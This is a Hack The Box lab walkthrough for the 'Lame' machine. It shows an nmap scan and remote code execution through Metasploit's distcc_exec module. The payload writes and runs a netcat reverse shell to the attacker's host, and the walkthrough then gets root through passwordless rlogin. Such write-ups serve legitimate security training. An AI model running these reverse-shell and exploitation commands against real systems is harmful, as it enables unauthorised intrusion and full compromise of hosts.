---
title: Hack The Box&#58; Lame
permalink: /HTB/Love
layout: default
---
<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Lame_Big.png?raw=true" unselectable="on" class="Box_Logo" />

Lame is an easy level box on HackTheBox and covers many basics. There are multiple approaches for this box and overall it was pretty fun.

# Walkthrough
Start off by performing a complete, general nmap scan `nmap -p-`
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```
Note that `distccd`, an exploitable service, is running. Remote code execution is possible through Metasploit. Using `exploit/unix/misc/distcc_exec`, set the payload to `cmd/unix/generic` with the command as `echo "nc -e /bin/bash <ip> <port>" > b.sh ; ./b.sh`. The options should look similar to this
```
Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   3632             yes       The target port (TCP)


Payload options (cmd/unix/generic):

   Name  Current Setting                                                                     Required  Description
   ----  ---------------                                                                     --------  -----------
   CMD   echo "nc -e /bin/bash 10.10.14.4 4444" > b.sh ; chmod +x ./b.sh ; ./b.sh            yes       The command string to execute


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
   ```
This payload creates a script for a reverse shell on the victim machine, makes it executable, then executes it. So before this exploit is run, make sure you have a listener open on your host with `nc -nvlp <port>`. After receiving a connection and upgrading our shell with `python -c 'import pty; pty.spawn("/bin/bash")`, we should have something like this:
```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.3] 52475
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@lame:/tmp$ 
```
Enumerating further with `nmap localhost` gives us much more information now.
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
953/tcp  open  rndc
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
3632/tcp open  distccd
4444/tcp open  krb524
5432/tcp open  postgres
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
```
Port 513, rlogin, is dated and vulnerable by default and doesn't require password by default. This can be exploited with `rlogin localhsot -l root`.
```
rlogin localhost -l root
Last login: Thu Sep 30 10:48:49 EDT 2021 from :0.0 on pts/0
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@lame:~# 
```
We have successfully rooted the machine.
